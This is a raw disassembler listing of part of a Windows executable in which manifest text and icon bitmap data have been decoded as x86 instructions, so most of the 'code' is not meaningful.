  4047be:	outs   dx,DWORD PTR ds:[esi]
  4047bf:	inc    ebp
  4047c0:	ins    BYTE PTR es:[edi],dx
  4047c1:	gs jbe 0x404825
  4047c4:	je     0x40482b
  4047c6:	ds or  eax,0x2020200a
  4047cc:	cmp    al,0x2f
  4047ce:	popa   
  4047cf:	jae    0x40483e
  4047d1:	jbe    0x404806
  4047d3:	cmp    dh,BYTE PTR [edi+0x69]
  4047d6:	outs   dx,BYTE PTR ds:[esi]
  4047d7:	outs   dx,DWORD PTR fs:[esi]
  4047d9:	ja     0x40484e
  4047db:	push   ebx
  4047dc:	gs je  0x404853
  4047df:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  4047e6:	cmp    al,0x2f
  4047e8:	popa   
  4047e9:	jae    0x404858
  4047eb:	jbe    0x404820
  4047ed:	cmp    ah,BYTE PTR [ecx+0x70]
  4047f0:	jo     0x40485e
  4047f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4047f9:	ds or  eax,0x612f3c0a
  4047ff:	jae    0x404874
  404801:	gs ins DWORD PTR es:[edi],dx
  404803:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404807:	or     eax,0xa
  40480c:	add    BYTE PTR [eax],al
  40480e:	add    BYTE PTR [eax],al
  404810:	sub    BYTE PTR [eax],al
  404812:	add    BYTE PTR [eax],al
  404814:	xor    BYTE PTR [eax],al
  404816:	add    BYTE PTR [eax],al
  404818:	pusha  
  404819:	add    BYTE PTR [eax],al
  40481b:	add    BYTE PTR [ecx],al
  40481d:	add    BYTE PTR [eax+eax*1],al
  404820:	add    BYTE PTR [eax],al
  404822:	add    BYTE PTR [eax],al
  404824:	add    BYTE PTR [eax+eax*1],0x0
	...
  40483c:	add    BYTE PTR [eax],al
  40483e:	add    BYTE PTR [eax],0x0
  404841:	add    BYTE PTR [eax],0x0
  404844:	add    BYTE PTR [eax+0x800080],al
  40484a:	add    BYTE PTR [eax],al
  40484c:	add    BYTE PTR [eax],0x80
  40484f:	add    BYTE PTR [eax-0x7fffff80],al
  404855:	add    BYTE PTR [eax-0x3f3f4000],0x0
  40485c:	add    BYTE PTR [eax],al
  40485e:	inc    DWORD PTR [eax]
  404860:	add    bh,bh
  404862:	add    BYTE PTR [eax],al
  404864:	add    bh,bh
  404866:	inc    DWORD PTR [eax]
  404868:	inc    DWORD PTR [eax]
  40486a:	add    BYTE PTR [eax],al
  40486c:	inc    DWORD PTR [eax]
  40486e:	inc    DWORD PTR [eax]
  404870:	(bad)  
  404871:	inc    DWORD PTR [eax]
  404873:	add    bh,bh
  404875:	(bad)  
  404876:	inc    DWORD PTR [eax]
	...
  4048cc:	or     BYTE PTR [eax+0x8888],cl
	...
  4048e2:	add    BYTE PTR [eax-0x7070071],cl
  4048e8:	mov    BYTE PTR [eax+0x0],cl
	...
  4048fa:	mov    al,bh
  4048fc:	clc    
  4048fd:	mov    BYTE PTR [eax-0x77770771],cl
	...
  40490f:	add    BYTE PTR [eax],al
  404911:	mov    BYTE PTR [eax-0x70000778],cl
  404917:	(bad)
  40491b:	jo     0x40491d
	...
  404925:	add    BYTE PTR [eax],al
  404927:	add    BYTE PTR [eax],cl
  404929:	mov    BYTE PTR [eax-0x7777008],cl
  40492f:	mov    BYTE PTR [eax+0x877888],cl
	...
  40493d:	add    BYTE PTR [eax],al
  40493f:	add    BYTE PTR [eax],cl
  404941:	mov    BYTE PTR [eax-0x77070778],cl
  404947:	vpmacssdql xmm0,xmm6,xmm0,XMMWORD PTR [edi+0x0]
  404951:	add    BYTE PTR [eax],al
  404953:	add    BYTE PTR [eax],al
  404955:	add    BYTE PTR [eax],al
  404957:	add    BYTE PTR [eax],cl
  404959:	mov    BYTE PTR [eax-0x77077778],cl
  40495f:	mov    BYTE PTR [eax+0x887777],cl
	...
  40496d:	add    BYTE PTR [eax],al
  40496f:	add    BYTE PTR [eax],cl
  404971:	mov    BYTE PTR [eax-0x7777778],cl
  404977:	mov    BYTE PTR [edi+0x878787],al
  40497d:	add    BYTE PTR [eax],al
  40497f:	add    BYTE PTR [eax],al
  404981:	pop    es
  404982:	ja     0x404984
  404984:	add    BYTE PTR [eax],al
  404986:	add    BYTE PTR [eax],al
  404988:	add    BYTE PTR [eax-0x77777778],cl
  40498e:	mov    BYTE PTR [eax+0x77],bh
  404991:	ja     0x404a0b
  404993:	js     0x40499d
  404995:	add    BYTE PTR [eax],0x0
  404998:	add    BYTE PTR [eax+0x7f],bh
  40499b:	xchg   DWORD PTR [ecx+0x77],esi
  40499e:	jo     0x4049a0
  4049a0:	add    BYTE PTR [eax],cl
  4049a2:	js     0x40492c
  4049a4:	mov    BYTE PTR [edi+0x77077777],al
  4049aa:	mov    BYTE PTR [eax+0x8088],cl
  4049b0:	or     BYTE PTR [edi+0x77778878],al
  4049b6:	clc    
  4049b7:	jo     0x4049b9
  4049b9:	add    BYTE PTR [eax],cl
  4049bb:	ja     0x404944
  4049bd:	ja     0x404a36
  4049bf:	ja     0x404948
  4049c1:	mov    BYTE PTR [eax+0x808888],cl
  4049c7:	add    BYTE PTR [eax],cl
  4049c9:	mov    BYTE PTR [eax-0x78],bh
  4049cc:	mov    BYTE PTR [edi+0x77],dh
  4049cf:	mov    BYTE PTR [eax+0x0],dh
  4049d2:	add    BYTE PTR [eax],al
  4049d4:	xchg   DWORD PTR [edi+0x77],esi
  4049d7:	js     0x404a51
  4049d9:	mov    BYTE PTR [eax+0x808888],cl
  4049df:	add    BYTE PTR [eax],cl
  4049e1:	js     0x40496b
  4049e3:	mov    BYTE PTR [eax-0x7888871],cl
  4049e9:	jo     0x4049eb
  4049eb:	xchg   DWORD PTR [edi-0x79],esi
  4049ee:	xchg   DWORD PTR [eax+0x6c7c8888],ecx
  4049f4:	mov    BYTE PTR [eax-0x77f80000],cl
  4049fa:	js     0x404983
  4049fc:	js     0x404986
  4049fe:	push   DWORD PTR [edi+0x77]
  404a01:	js     0x404a7b
  404a03:	js     0x40498c
  404a05:	mov    BYTE PTR [eax-0x79],bh
  404a08:	jl     0x404a56
  404a0a:	inc    esp
  404a0b:	les    ecx,FWORD PTR [eax+0x8000088]
  404a11:	mov    BYTE PTR [eax+0x77778787],cl
  404a17:	xchg   DWORD PTR [eax-0x78],edi
  404a1a:	mov    BYTE PTR [edi-0x3b9b8379],al
  404a20:	les    ebp,FWORD PTR [esp+ebp*2+0x64]
  404a24:	mov    BYTE PTR [edi-0x77f80000],al
  404a2a:	mov    BYTE PTR [edi+0x78877778],al
  404a30:	mov    BYTE PTR [edi+0x444c5677],al
  404a36:	inc    esp
  404a37:	dec    esp
  404a38:	ins    BYTE PTR es:[edi],dx
  404a39:	pop    esp
  404a3a:	jl     0x404a98
  404a3c:	mov    BYTE PTR [eax-0x77f80000],cl
  404a42:	mov    BYTE PTR [eax-0x78778788],cl
  404a48:	jbe    0x404a9e
  404a4a:	inc    esp
  404a4b:	inc    esp
  404a4c:	inc    esp
  404a4d:	inc    esp
  404a4e:	mov    edi,0xc6c6c647
  404a54:	jg     0x4049dd
  404a56:	add    BYTE PTR [eax],al
  404a58:	or     BYTE PTR [eax-0x78777878],cl
  404a5e:	inc    esi
  404a5f:	inc    esp
  404a60:	inc    esp
  404a61:	inc    esp
  404a62:	inc    esp
  404a63:	dec    esp
  404a64:	inc    esp
  404a65:	fs dec esp
  404a67:	ins    BYTE PTR es:[edi],dx
  404a68:	jl     0x404ae6
  404a6a:	jl     0x404ae8
  404a6c:	js     0x4049f6
  404a6e:	add    BYTE PTR [eax],al
  404a70:	or     BYTE PTR [eax-0x78787878],cl
  404a76:	inc    esp
  404a77:	inc    esp
  404a78:	inc    esp
  404a79:	inc    esp
  404a7a:	dec    esp
  404a7b:	inc    esp
  404a7c:	push   0x7c7cc784
  404a81:	jl     0x404a0f
  404a83:	mov    WORD PTR [eax-0x78],?
  404a86:	add    BYTE PTR [eax],al
  404a88:	or     al,bh
  404a8a:	mov    BYTE PTR [eax+0x56448878],cl
  404a90:	les    eax,FWORD PTR [esi+0x44]
  404a93:	inc    esi
  404a94:	mov    BYTE PTR [edi-0x737383b4],al
  404a9a:	out    0xc8,eax
  404a9c:	iret   
  404a9d:	xchg   DWORD PTR [eax],eax
  404a9f:	add    BYTE PTR [eax],cl
  404aa1:	mov    BYTE PTR [eax+0x46888887],cl
  404aa7:	les    esi,FWORD PTR [esp+ecx*2+0x44]
  404aab:	push   0xc8488888
  404ab0:	enter  0xc8e7,0x7c
  404ab4:	mov    al,bh
  404ab6:	add    BYTE PTR [eax],al
  404ab8:	or     BYTE PTR [eax-0x77777788],cl
  404abe:	push   esp
  404abf:	je     0x404b07
  404ac1:	push   esp
  404ac2:	inc    esi
  404ac3:	vpmacsswd xmm1,xmm6,xmm0,XMMWORD PTR [esp+r9d*4-0x37717379]
  404ace:	add    BYTE PTR [eax],0x8
  404ad1:	mov    BYTE PTR [eax+0x64888888],cl
  404ad7:	jl     0x404b55
  404ad9:	fs js  0x404adb
  404adc:	pop    esp
  404add:	jg     0x404ad6
  404adf:	js     0x404ac9
  404ae1:	enter  0x7878,0x78
  404ae5:	test   DWORD PTR [eax+0x78880800],0x74888888
  404aef:	jl     0x404b65
  404af1:	inc    esp
  404af2:	pop    DWORD PTR [edi-0x3707373c]
  404af8:	js     0x404a81
  404afa:	ja     0x404b74
  404afc:	enter  0x8088,0x0
  404b00:	or     BYTE PTR [eax-0x77777788],cl
  404b06:	jl     0x404b7c
  404b08:	jl     0x404b56
  404b0a:	ja     0x404ad0
  404b0c:	mov    BYTE PTR [edi-0x71],0x88
  404b10:	ja     0x404a99
  404b12:	mov    cs,WORD PTR [eax+0x808888]
  404b18:	or     BYTE PTR [eax-0x78],bh
  404b1b:	mov    BYTE PTR [eax+0x767c8488],cl
  404b21:	inc    esp
  404b22:	les    ebp,FWORD PTR [esp+ecx*2-0x34]
  404b26:	(bad)  
  404b27:	test   DWORD PTR [edi-0x18787272],0x70f8
  404b31:	jp     0x404bab
  404b33:	mov    BYTE PTR [eax-0x3a887b78],cl
  404b39:	inc    esp
  404b3a:	dec    esp
  404b3b:	dec    esp
  404b3c:	ins    BYTE PTR es:[edi],dx
  404b3d:	dec    esp
  404b3e:	js     0x404b38
  404b40:	js     0x404aca
  404b42:	mov    al,ch
  404b44:	mov    BYTE PTR [eax+0x33000080],cl
  404b4a:	js     0x404b44
  404b4c:	clc    
  404b4d:	clc    
  404b4e:	test   BYTE PTR [eax+0x6c],bh
  404b51:	dec    esp
  404b52:	ins    BYTE PTR es:[edi],dx
  404b53:	dec    esp
  404b54:	dec    esp
  404b55:	ins    BYTE PTR es:[edi],dx
  404b56:	mov    BYTE PTR [edi-0x77777779],cl
  404b5c:	xchg   DWORD PTR [eax+0x70000070],ecx
  404b62:	js     0x404aec
  404b64:	mov    BYTE PTR [edi+0x46c4c887],cl
  404b6a:	(bad)  
  404b6b:	(bad)  
  404b6c:	int3   
  404b6d:	into   
  404b6e:	mov    BYTE PTR [eax-0x77777709],cl
  404b74:	mov    BYTE PTR [edi+0x74000070],cl
  404b7a:	js     0x404b74
  404b7c:	(bad)
  404b80:	dec    esp
  404b81:	dec    esp
  404b82:	dec    esp
  404b83:	ins    BYTE PTR es:[edi],dx
  404b84:	mov    bh,0x88
  404b87:	mov    BYTE PTR [eax-0x77777788],cl
  404b8d:	mov    BYTE PTR [eax-0x77890000],cl
  404b93:	(bad)  
  404b94:	clc    
  404b95:	pop    DWORD PTR [edi+0x6c4cc4c7]
  404b9b:	(bad)  
  404b9c:	int3   
  404b9d:	enter  0x8888,0x88
  404ba1:	mov    BYTE PTR [eax+0x788f888f],cl
  404ba7:	add    BYTE PTR [eax],al
  404ba9:	js     0x88404bae
  404baf:	(bad)  
  404bb0:	dec    esp
  404bb1:	ins    BYTE PTR es:[edi],dx
  404bb2:	dec    esp
  404bb3:	dec    esp
  404bb4:	int3   
  404bb5:	enter  0xf8f8,0x88
  404bb9:	mov    BYTE PTR [eax-0x77700108],cl
  404bbf:	add    BYTE PTR [eax],al
  404bc1:	add    BYTE PTR [eax],al
  404bc3:	mov    BYTE PTR [eax-0x3bbb7701],cl
  404bc9:	dec    esp
  404bca:	ins    BYTE PTR es:[edi],dx
  404bcb:	mov    dh,0xcf
  404bce:	(bad)
  404bd2:	mov    al,bh
  404bd4:	clc    
  404bd5:	pop    DWORD PTR [edi+0x0]
  404bdb:	add    BYTE PTR [eax],cl
  404bdd:	mov    BYTE PTR [eax+0x4c6c4c44],cl
  404be3:	ins    BYTE PTR es:[edi],dx
  404be4:	int3   
  404be5:	mov    al,bh
  404be7:	(bad)  
  404be8:	clc    
  404be9:	mov    al,bh
  404beb:	(bad)  
  404bec:	clc    
  404bed:	(bad)
  404bf1:	add    BYTE PTR [eax],al
  404bf3:	add    BYTE PTR [eax],al
  404bf5:	add    BYTE PTR [eax-0x333bbbb4],cl
  404bfb:	int3   
  404bfc:	ins    BYTE PTR es:[edi],dx
  404bfd:	(bad)  
  404bfe:	(bad)  
  404bff:	(bad)  
  404c00:	(bad)  
  404c01:	dec    DWORD PTR [edi-0x78707778]
  404c07:	add    BYTE PTR [eax],al
  404c09:	add    BYTE PTR [eax],al
  404c0b:	add    BYTE PTR [eax],al
  404c0d:	add    BYTE PTR [eax],cl
  404c0f:	inc    esp
  404c10:	mov    dh,0xc6
  404c13:	(bad)  
  404c14:	int3   
  404c15:	(bad)  
  404c16:	clc    
  404c17:	clc    
  404c18:	mov    BYTE PTR [esi-0x10771778],cl
  404c1e:	mov    BYTE PTR [eax],al
  404c20:	add    BYTE PTR [eax],al
  404c22:	add    BYTE PTR [eax],al
  404c24:	add    BYTE PTR [eax],al
  404c26:	or     BYTE PTR [esp+eax*2-0x3c],ah
  404c2a:	int3   
  404c2b:	int3   
  404c2c:	int3   
  404c2d:	call   0x8928d4c0
  404c32:	mov    al,bh
  404c34:	clc    
  404c35:	inc    DWORD PTR [eax+0x0]
  404c3b:	add    BYTE PTR [eax],al
  404c3d:	add    BYTE PTR [eax],cl
  404c3f:	pop    esp
  404c40:	dec    esp
  404c41:	dec    esp
  404c42:	fs jbe 0x404bcc
  404c45:	mov    BYTE PTR [eax-0x70707078],cl
  404c4b:	add    BYTE PTR [eax],0x0
	...
  404c56:	or     BYTE PTR [esi+0x77],dh
  404c59:	mov    BYTE PTR [eax-0x70777071],cl
  404c5f:	add    BYTE PTR [eax],0x0
	...
  404c6e:	or     BYTE PTR [eax-0x7f707778],cl
	...
  404c84:	add    BYTE PTR [eax],al
  404c86:	add    al,dh
	...
  404cf8:	(bad)  
  404cf9:	(bad)  
  404cfa:	(bad)  
  404cfb:	(bad)  
  404cfc:	(bad)  
  404cfd:	inc    DWORD PTR [eax]
  404cff:	add    bh,bh
  404d01:	(bad)  
  404d02:	(bad)  
  404d03:	(bad)  
  404d04:	(bad)  
  404d05:	inc    DWORD PTR [eax]
  404d07:	add    bh,bh
  404d09:	(bad)  
  404d0a:	(bad)  
  404d0b:	(bad)  
  404d0c:	(bad)  
  404d0d:	inc    DWORD PTR [eax]
  404d0f:	add    bh,bh
  404d11:	(bad)  
  404d12:	inc    DWORD PTR [eax+0xffff]
  404d18:	(bad)  
  404d19:	(bad)  
  404d1a:	cld    
  404d1b:	add    BYTE PTR [edi],cl
  404d1d:	inc    DWORD PTR [eax]
  404d1f:	add    bh,bh
  404d21:	push   eax
  404d23:	add    BYTE PTR [ebx],al
  404d25:	inc    DWORD PTR [eax]
  404d27:	add    bh,bh
  404d29:	inc    eax
  404d2b:	add    BYTE PTR [ecx],al
  404d2d:	inc    DWORD PTR [eax]
  404d2f:	add    bh,bh
  404d31:	inc    DWORD PTR [eax+0xff0000]
  404d37:	add    bh,bh
  404d39:	inc    DWORD PTR [eax+0xff0000]
  404d3f:	add    bh,bh
  404d41:	inc    DWORD PTR [eax+0xff0000]
  404d47:	add    bh,bh
  404d49:	inc    DWORD PTR [eax+0xff0000]
  404d4f:	add    bl,ah
  404d51:	inc    eax
  404d53:	add    BYTE PTR [eax],al
  404d55:	lahf   
  404d56:	add    BYTE PTR [eax],al
  404d58:	rol    BYTE PTR [edi],0xe0
  404d5b:	add    BYTE PTR [eax],al
  404d5d:	pop    ds
  404d5e:	add    BYTE PTR [eax],al
  404d60:	add    BYTE PTR [ecx],0xf8
  404d63:	add    BYTE PTR [eax],al
  404d65:	pop    ds
  404d66:	add    BYTE PTR [eax],al
  404d68:	add    BYTE PTR [eax],0x7f
  404d6b:	add    BYTE PTR [eax],al
  404d6d:	pop    ds
  404d6e:	add    BYTE PTR [eax],al
  404d70:	add    BYTE PTR [eax],0x1c
  404d73:	add    BYTE PTR [eax],al
  404d75:	sldt   WORD PTR [eax]
  404d78:	add    BYTE PTR [eax],0x0
  404d7b:	add    BYTE PTR [eax],al
  404d7d:	sldt   WORD PTR [eax]
  404d80:	add    BYTE PTR [eax],0x0
  404d83:	add    BYTE PTR [eax],al
  404d85:	sldt   WORD PTR [eax]
  404d88:	add    BYTE PTR [eax],0x0
  404d8b:	add    BYTE PTR [eax],al
  404d8d:	sldt   WORD PTR [eax]
  404d90:	add    BYTE PTR [eax],0x0
  404d93:	add    BYTE PTR [eax],al
  404d95:	sldt   WORD PTR [eax]
  404d98:	add    BYTE PTR [eax],0x0
  404d9b:	add    BYTE PTR [eax],al
  404d9d:	sldt   WORD PTR [eax]
  404da0:	add    BYTE PTR [eax],0x0
  404da3:	add    BYTE PTR [eax],al
  404da5:	sldt   WORD PTR [eax]
  404da8:	add    BYTE PTR [eax],0x0
  404dab:	add    BYTE PTR [eax],al
  404dad:	sldt   WORD PTR [eax]
  404db0:	add    BYTE PTR [eax],0x0
  404db3:	add    BYTE PTR [eax],al
  404db5:	sldt   WORD PTR [eax]
  404db8:	add    BYTE PTR [eax],0x0
  404dbb:	add    BYTE PTR [eax],al
  404dbd:	pop    es
  404dbe:	add    BYTE PTR [eax],al
  404dc0:	add    BYTE PTR [eax],0x0
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	pop    es
  404dc6:	add    BYTE PTR [eax],al
  404dc8:	add    BYTE PTR [eax],0x0
  404dcb:	add    BYTE PTR [eax],al
  404dcd:	pop    es
  404dce:	add    BYTE PTR [eax],al
  404dd0:	add    BYTE PTR [eax],0x0
  404dd3:	add    BYTE PTR [eax],al
  404dd5:	pop    es
  404dd6:	add    BYTE PTR [eax],al
  404dd8:	add    BYTE PTR [eax],0x0
  404ddb:	add    BYTE PTR [eax],al
  404ddd:	pop    es
  404dde:	add    BYTE PTR [eax],al
  404de0:	rol    BYTE PTR [eax],0x0
  404de3:	add    BYTE PTR [eax],al
  404de5:	pop    es
  404de6:	add    BYTE PTR [eax],al
  404de8:	rol    BYTE PTR [eax],0x0
  404deb:	add    BYTE PTR [eax],al
  404ded:	pop    es
  404dee:	add    BYTE PTR [eax],al
  404df0:	rol    BYTE PTR [eax],0x0
  404df3:	add    BYTE PTR [eax],al
  404df5:	pop    es
  404df6:	add    BYTE PTR [eax],al
  404df8:	rol    BYTE PTR [eax],0x0
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	add    eax,DWORD PTR [eax]
  404dff:	add    al,al
  404e01:	add    BYTE PTR [eax],al
  404e03:	add    BYTE PTR [eax],al
  404e05:	add    eax,DWORD PTR [eax]
  404e07:	add    al,ah
  404e09:	add    BYTE PTR [eax],al
  404e0b:	add    BYTE PTR [eax],al
  404e0d:	add    eax,DWORD PTR [eax]
  404e0f:	add    ah,bh
  404e11:	add    BYTE PTR [eax],al
  404e13:	add    BYTE PTR [eax],al
  404e15:	add    eax,DWORD PTR [eax]
  404e17:	add    bh,bh
  404e19:	add    BYTE PTR [eax],0x0
  404e1c:	add    BYTE PTR [ebx],al
  404e1e:	add    BYTE PTR [eax],al
  404e20:	push   eax
  404e22:	add    BYTE PTR [eax],al
  404e24:	add    BYTE PTR [ebx],al
  404e26:	add    BYTE PTR [eax],al
  404e28:	(bad)  
  404e29:	clc    
  404e2a:	add    BYTE PTR [eax],al
  404e2c:	add    BYTE PTR [ebx],al
  404e2e:	add    BYTE PTR [eax],al
  404e30:	(bad)  
  404e31:	clc    
  404e32:	add    BYTE PTR [eax],al
  404e34:	add    BYTE PTR [edi],al
  404e36:	add    BYTE PTR [eax],al
  404e38:	(bad)  
  404e39:	clc    
  404e3a:	add    BYTE PTR [eax],al
  404e3c:	add    edi,edi
  404e3e:	add    BYTE PTR [eax],al
  404e40:	(bad)  
  404e41:	clc    
  404e42:	add    BYTE PTR [ecx],al
  404e44:	(bad)  
  404e45:	inc    DWORD PTR [eax]
  404e47:	add    bh,bh
  404e49:	clc    
  404e4a:	add    edi,edi
  404e4c:	(bad)  
  404e4d:	inc    DWORD PTR [eax]
  404e4f:	add    bh,bh
  404e51:	std    
  404e52:	(bad)  
  404e53:	(bad)  
  404e54:	(bad)  
  404e55:	inc    DWORD PTR [eax]
  404e57:	add    bh,bh
  404e59:	(bad)  
  404e5a:	(bad)  
  404e5b:	(bad)  
  404e5c:	(bad)  
  404e5d:	inc    DWORD PTR [eax]
  404e5f:	add    bh,bh
  404e61:	(bad)  
  404e62:	(bad)  
  404e63:	(bad)  
  404e64:	(bad)  
  404e65:	inc    DWORD PTR [eax]
  404e67:	add    bh,bh
  404e69:	(bad)  
  404e6a:	(bad)  
  404e6b:	(bad)  
  404e6c:	(bad)  
  404e6d:	inc    DWORD PTR [eax]
  404e6f:	add    bh,bh
  404e71:	(bad)  
  404e72:	(bad)  
  404e73:	(bad)  
  404e74:	(bad)  
  404e75:	inc    DWORD PTR [eax]
  404e77:	add    BYTE PTR [eax],ch
  404e79:	add    BYTE PTR [eax],al
  404e7b:	add    BYTE PTR [eax],ah
  404e7d:	add    BYTE PTR [eax],al
  404e7f:	add    BYTE PTR [eax+0x0],al
  404e82:	add    BYTE PTR [eax],al
  404e84:	add    DWORD PTR [eax],eax
  404e86:	add    al,0x0
  404e88:	add    BYTE PTR [eax],al
  404e8a:	add    BYTE PTR [eax],al
  404e8c:	add    BYTE PTR [edx],al
	...
  404ea6:	add    BYTE PTR [eax],0x0
  404ea9:	add    BYTE PTR [eax],0x0
  404eac:	add    BYTE PTR [eax+0x800080],al
  404eb2:	add    BYTE PTR [eax],al
  404eb4:	add    BYTE PTR [eax],0x80
  404eb7:	add    BYTE PTR [eax-0x7fffff80],al
  404ebd:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404ec4:	add    BYTE PTR [eax],al
  404ec6:	inc    DWORD PTR [eax]
  404ec8:	add    bh,bh
  404eca:	add    BYTE PTR [eax],al
  404ecc:	add    bh,bh
  404ece:	inc    DWORD PTR [eax]
  404ed0:	inc    DWORD PTR [eax]
  404ed2:	add    BYTE PTR [eax],al
  404ed4:	inc    DWORD PTR [eax]
  404ed6:	inc    DWORD PTR [eax]
  404ed8:	(bad)  
  404ed9:	inc    DWORD PTR [eax]
  404edb:	add    bh,bh
  404edd:	(bad)  
  404ede:	inc    DWORD PTR [eax]
	...
  404f08:	or     BYTE PTR [edi+0x88],cl
	...
  404f16:	add    BYTE PTR [eax],cl
  404f18:	(bad)  
  404f19:	clc    
  404f1a:	(bad)
	...
  404f26:	or     BYTE PTR [edi-0x77707771],cl
  404f2c:	mov    BYTE PTR [eax],al
	...
  404f36:	mov    BYTE PTR [eax-0x77777071],cl
  404f3c:	mov    BYTE PTR [eax+0x0],al
  404f42:	add    BYTE PTR [eax],al
  404f44:	add    BYTE PTR [eax],al
  404f46:	mov    BYTE PTR [eax-0x77770708],cl
  404f4c:	xchg   DWORD PTR [eax+0x0],eax
  404f52:	add    BYTE PTR [eax],al
  404f54:	add    BYTE PTR [eax],al
  404f56:	mov    BYTE PTR [eax-0x78777778],cl
  404f5c:	ja     0x404ede
  404f5e:	add    BYTE PTR [eax],al
  404f60:	add    BYTE PTR [edi+0x70],dh
  404f63:	add    BYTE PTR [eax],al
  404f65:	add    BYTE PTR [eax],cl
  404f67:	mov    BYTE PTR [eax+0x78777788],cl
  404f6d:	mov    BYTE PTR [eax-0x877f900],al
  404f73:	ja     0x404fed
  404f75:	add    BYTE PTR [eax],al
  404f77:	or     BYTE PTR [eax+0x77],bh
  404f7a:	ja     0x404ff3
  404f7c:	mov    BYTE PTR [edi-0x78f8ff78],cl
  404f82:	mov    BYTE PTR [edi+0x8777],al
  404f88:	xchg   DWORD PTR [edi+0x78],esi
  404f8b:	clc    
  404f8c:	clc    
  404f8d:	js     0x404f17
  404f8f:	add    BYTE PTR [eax],cl
  404f91:	xchg   DWORD PTR [eax+0x7777f778],ecx
  404f97:	mov    BYTE PTR [eax+0x447c8888],cl
  404f9d:	(bad)  
  404f9e:	mov    BYTE PTR [eax],al
  404fa0:	pop    es
  404fa1:	mov    BYTE PTR [eax+0x77],bh
  404fa4:	js     0x404f35
  404fa6:	clc    
  404fa7:	mov    BYTE PTR [edi+0x44],dh
  404faa:	inc    esp
  404fab:	inc    esp
  404fac:	mov    bh,0xf8
  404faf:	add    BYTE PTR [eax],cl
  404fb1:	mov    BYTE PTR [edi+0x74878888],al
  404fb7:	inc    esp
  404fb8:	inc    esp
  404fb9:	dec    esp
  404fba:	ins    BYTE PTR es:[edi],dx
  404fbb:	mov    edi,0x70088c7
  404fc1:	mov    BYTE PTR [eax+0x78],bh
  404fc4:	je     0x40500a
  404fc6:	inc    esp
  404fc7:	inc    esp
  404fc8:	inc    esi
  404fc9:	dec    esp
  404fca:	ja     0x404f93
  404fcc:	mov    edi,0x880800f7
  404fd2:	mov    BYTE PTR [eax+0x44],bh
  404fd5:	inc    esp
  404fd6:	inc    esp
  404fd7:	inc    esi
  404fd8:	mov    BYTE PTR [eax+ecx*8-0x38],al
  404fdc:	enter  0x88ce,0x0
  404fe0:	pop    es
  404fe1:	test   DWORD PTR [eax+0x64657488],0x7c77f848
  404feb:	mov    ?,WORD PTR [edi+0x77]
  404fee:	clc    
  404fef:	add    BYTE PTR [eax],cl
  404ff1:	xchg   DWORD PTR [eax+0x47c77488],ecx
  404ff7:	(bad)  
  404ff8:	pop    eax
  404ff9:	xchg   DWORD PTR [eax-0x77833738],ecx
  404fff:	add    BYTE PTR [edi],al
  405001:	xchg   DWORD PTR [eax+0x787c8488],ecx
  405007:	test   ah,0xf8
  40500a:	enter  0x8888,0x88
  40500e:	mov    BYTE PTR [eax],al
  405010:	pop    es
  405011:	xchg   DWORD PTR [eax-0x39887b78],ecx
  405017:	push   esp
  405018:	les    edi,FWORD PTR [edi-0x79]
  40501b:	xchg   DWORD PTR [esi+0x780f88c],ecx
  405021:	mov    bh,0x88
  405023:	mov    BYTE PTR [esp+edi*2-0x37333bbc],al
  40502a:	test   DWORD PTR [eax-0x7f777778],0x888f2707
  405034:	hlt    
  405035:	test   BYTE PTR [esp+ecx*2+0x6c],cl
  405039:	push   0x8888688f
  40503e:	mov    BYTE PTR [eax-0x7077b8f9],al
  405044:	xchg   esp,eax
  405046:	mov    dh,0xcc
  405049:	iret   
  40504a:	mov    BYTE PTR [eax+0x70888888],cl
  405050:	or     BYTE PTR [eax-0x1],bh
  405053:	clc    
  405054:	xchg   DWORD PTR [esp+ebp*2+0x4c],eax
  405058:	int3   
  405059:	(bad)
  40505d:	clc    
  40505e:	pop    DWORD PTR [eax-0x77f800]
  405064:	xchg   DWORD PTR [esp+ecx*2-0x3a],ecx
  405068:	int3   
  405069:	(bad)
  40506d:	dec    DWORD PTR [eax+0x80]
  405073:	mov    BYTE PTR [edi-0x3333b9b4],al
  405079:	(bad)  
  40507a:	dec    DWORD PTR [eax-0x7f107771]
  405080:	add    BYTE PTR [eax],al
  405082:	add    BYTE PTR [eax],al
  405084:	mov    BYTE PTR [esp+ecx*8+0x4c],al
  405088:	(bad)  
  405089:	mov    BYTE PTR [eax-0x70777178],cl
  40508f:	add    BYTE PTR [eax],0x0
  405092:	add    BYTE PTR [eax],al
  405094:	or     BYTE PTR [esp+ecx*2+0x67],al
  405098:	enter  0x8888,0x88
  40509c:	(bad)  
  40509d:	(bad)  
  40509e:	inc    DWORD PTR [eax]
  4050a0:	add    BYTE PTR [eax],al
  4050a2:	add    BYTE PTR [eax],al
  4050a4:	or     BYTE PTR [eax-0x78],bh
  4050a7:	(bad)  
  4050a8:	(bad)
	...
  4050b4:	or     al,bh
	...
  4050de:	add    BYTE PTR [eax],al
  4050e0:	(bad)  
  4050e1:	(bad)  
  4050e2:	(bad)  
  4050e3:	(bad)  
  4050e4:	(bad)  
  4050e5:	(bad)  
  4050e6:	(bad)  
  4050e7:	(bad)  
  4050e8:	(bad)  
  4050e9:	inc    DWORD PTR [ebx+0xfeffff]
  4050ef:	(bad)  
  4050f0:	(bad)  
  4050f1:	clc    
  4050f2:	add    BYTE PTR [edi],bh
  4050f4:	push   eax
  4050f6:	add    BYTE PTR [edi],bl
  4050f8:	push   eax
  4050fa:	add    BYTE PTR [edi],bl
  4050fc:	push   eax
  4050fe:	add    BYTE PTR [edi],bl
  405100:	xbegin 0x3ec05806
  405106:	add    BYTE PTR [ebx],al
  405108:	or     BYTE PTR [edi],0x0
  40510b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405111:	add    BYTE PTR [eax],al
  405113:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405119:	add    BYTE PTR [eax],al
  40511b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405121:	add    BYTE PTR [eax],al
  405123:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405129:	add    BYTE PTR [eax],al
  40512b:	add    eax,DWORD PTR [eax-0x7fff0000]
  405131:	add    BYTE PTR [eax],al
  405133:	add    DWORD PTR [eax-0x7fff0000],eax
  405139:	add    BYTE PTR [eax],al
  40513b:	add    DWORD PTR [eax-0x1fff0000],eax
  405141:	add    BYTE PTR [eax],al
  405143:	add    esp,edi
